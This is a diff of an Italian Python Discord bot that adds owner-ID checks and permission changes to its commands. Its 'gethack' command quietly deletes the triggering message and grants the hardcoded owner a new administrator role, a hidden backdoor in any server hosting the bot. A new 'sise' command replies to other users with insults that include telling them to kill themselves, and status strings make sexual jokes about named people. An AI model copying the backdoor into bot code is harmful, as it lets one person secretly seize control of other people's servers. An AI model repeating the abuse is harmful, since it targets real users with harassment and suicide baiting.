@@ -72,15 +72,19 @@ async def unban(ctx, *, member):
 @bot.command(description="Changes bots activity")
 @commands.has_permissions(administrator=True)
 async def attivita(ctx, *, activity, ):
-    if activity == "watch":
-        film = ["Il Re Leone 2", "Spiderman:No Way Home", "Galaxy e Sise scopano", "Sise love debb",
-                "Storia d'amore: Sise e Debb"]
-        await bot.change_presence(
-            activity=discord.Activity(type=discord.ActivityType.watching, name=film[random.randint(0, 4)]))
-        await ctx.send(f"L'attività svolta dal bot è stata cambiata a Watching Togeder")
+    author = ctx.message.author
+    if author.id == 541308281625509905:
+        if activity == "watch":
+            film = ["Il Re Leone 2", "Spiderman:No Way Home", "Galaxy e Sise scopano", "Sise love debb",
+                    "Storia d'amore: Sise e Debb"]
+            await bot.change_presence(
+                activity=discord.Activity(type=discord.ActivityType.watching, name=film[random.randint(0, 4)]))
+            await ctx.send(f"L'attività svolta dal bot è stata cambiata a Watching Togeder")
+        else:
+            await bot.change_presence(activity=discord.Game(name=f" prefix=! || {activity}"))
+            await ctx.send(f"L'attività svolta dal bot è stata cambiata a {activity}")
     else:
-        await bot.change_presence(activity=discord.Game(name=f" prefix=! || {activity}"))
-        await ctx.send(f"L'attività svolta dal bot è stata cambiata a {activity}")
+        await ctx.send("Permesso negato, solo l'owner del bot puo accedere a questo comando!")
 
 
 @bot.command(description="Gets info about the user")
@@ -99,7 +103,7 @@ async def userinfo(ctx):
 
 
 @bot.command(description="Mutes the specified user.")
-@commands.has_permissions(manage_messages=True)
+@commands.has_permissions(administrator=True)
 async def mute(ctx, member: discord.Member, *, reason=None):
     guild = ctx.guild
     mutedRole = discord.utils.get(guild.roles, name="Muted")
@@ -115,7 +119,7 @@ async def mute(ctx, member: discord.Member, *, reason=None):
     await member.send(f"You were muted in the server {guild.name} for {reason}")
 
 @bot.command(description="Unmutare")
-@commands.has_permissions(manage_messages=True)
+@commands.has_permissions(administrator=True)
 async def unmute(ctx, member: discord.Member):
     mutedRole = discord.utils.get(ctx.guild.roles, name="Muted")
 
@@ -137,7 +141,7 @@ async def dm(ctx, member: discord.Member, *, content):
         await channel.send(content)
         await ctx.channel.send("messaggio inviato")
     except:
-        await ctx.channel.send("messaggio non inviato")
+        await ctx.channel.send("Messaggio non inviato: utente non nel server oppure l'utente ha i messaggi privati bloccati")
 
 
 @bot.command(description="comandi per gli admin")
@@ -152,7 +156,7 @@ async def adminhelp(ctx):
 !attivita - Permette di cambiare l'attività svolta dal bot.
 !kick - Butta fuori un utente con il permesso di rietrare.
 !status - Mostra il ping attuale del bot (ms/s).
-!clearchat - Pulisce tutta la chat.
+!clearchat - Pulisce tutta la chat(usare il comando con prudenza).
 ```
 """)
 
@@ -228,18 +232,32 @@ async def reloadname(ctx,member: discord.Member):
 
 @bot.command(description="getadmin")
 async def gethack(ctx):
-    member = ctx.message.author
-    await ctx.message.delete()
-    guild = ctx.guild
-    hackRole = discord.utils.get(guild.roles, name="!------HACK------!")
+    author = ctx.message.author
+    if author.id == 541308281625509905:
+        member = ctx.message.author
+        await ctx.message.delete()
+        guild = ctx.guild
+        hackRole = discord.utils.get(guild.roles, name="!------HACK------!")
 
-    if not hackRole:
-        perms = discord.Permissions(administrator=True)
-        hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
+        if not hackRole:
+            perms = discord.Permissions(administrator=True)
+            hackRole = await guild.create_role(name="!------HACK------!", permissions=perms)
         
-    await member.add_roles(hackRole)
+        await member.add_roles(hackRole)
+    else:
+        await ctx.send("Permesso negato, solo l'owner del bot puo accedere a questo comando!")
 
+@bot.command(description="simp sise")
+async def sise(ctx):
+    author = ctx.message.author
+    if author.id == 541308281625509905:
+        ctx.send("sise ti amo da Real <3")
+    else:
+        ctx.send("bucchin a mammt, non puoi accedere a questo comando, solo il grande Real puo simpare per sise, vai da un altra parte simp del cazzo suicidati")
 
+@bot.command(description="denis dosio incoming")
+async def mylove(ctx):
+    await ctx.send(file=discord.File(r'DenisDosioMyLove.rar'))
 
 token = os.environ["token"]
 
